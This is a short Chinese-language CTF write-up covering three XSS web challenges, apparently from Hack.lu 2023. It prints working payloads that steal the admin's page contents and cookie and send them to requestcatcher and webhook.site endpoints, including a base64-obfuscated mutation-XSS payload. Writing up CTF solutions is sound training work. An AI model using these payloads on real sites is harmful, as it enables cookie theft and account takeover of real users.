# web
### Based Encoding
#xss 
用户的输入会进行一个自己写的base91算法编码然后回显
思路,`decode("<script>alert(1)</script>")`
但是发现存在不可见字符传参传不进去,但是代码里允许16进制传参,

```js
print(decode('<script>alert(1)</script>').hex())
//成功弹窗
```

但是需要读取admin的编码历史,需要用到一些base91码表里没有的值,比如`.`
```js
<script>
fetch("/")
	.then(x=>x.text())
		.then(x=>fetch("http://example.com",{
			method:"post",
			body:x		
		}))
</script>
```

```html
<script>
fetch("/")
    .then(x => x.text())
    .then(x => fetch("https://nice.requestcatcher.com/test", {
        method: "post",
        body: x
    }))
</script>aaa <!--防止base91解码后丢失数据>
```

接收到admin的页面截图
![image.png](https://gitee.com/leiye87/typora_picture/raw/master/20231018202947.png)
直接访问即可得到flag

### awesome I
#xss 
一个可以提交在线笔记的网页,需要xss到admin获取cookie来读取flag笔记

![image.png](https://gitee.com/leiye87/typora_picture/raw/master/20231018214928.png)
可以观察到使用htmx,

```html
<div hx-get="https://webhook.site/cd508abb-abf4-42db-92d8-af41cf9017b3" hx-trigger="load" hx-target="this" hx-on="htmx:afterRequest:fetch('https://webhook.site/cd508abb-abf4-42db-92d8-af41cf9017b3?a='+document.cookie)">click</div>
```

![image.png](https://gitee.com/leiye87/typora_picture/raw/master/20231018220811.png)
获取到admincookie
![image.png](https://gitee.com/leiye87/typora_picture/raw/master/20231018221504.png)

### awesomeII
#xss 

https://blog.bi0s.in/2023/10/16/Web/awesomenotes-2-HackluCTF2023/
![image.png](https://gitee.com/leiye87/typora_picture/raw/master/20231018222050.png)

tags里是一堆数学公式标签,允许自定义style,


看不懂了,先把payload写上

---

```html
<math><annotation-xml encoding="text/html"><style><img src=x onerror="eval(atob('ZmV0Y2goYC9hcGkvbm90ZS9mbGFnYCkudGhlbigocik9PnIudGV4dCgpKS50aGVuKChyKT0+bG9jYXRpb249YGh0dHBzOi8vd2ViaG9vay5zaXRlL2NkNTA4YWJiLWFiZjQtNDJkYi05MmQ4LWFmNDFjZjkwMTdiMz9hPWArZW5jb2RlVVJJQ29tcG9uZW50KHIpKQo='))"></style></annotation-xml></math>
```

![image.png](https://gitee.com/leiye87/typora_picture/raw/master/20231018223907.png)

# reverse

# pwn

# crypto

# Misc


---
# *相关wp*




2023-10-18   15:52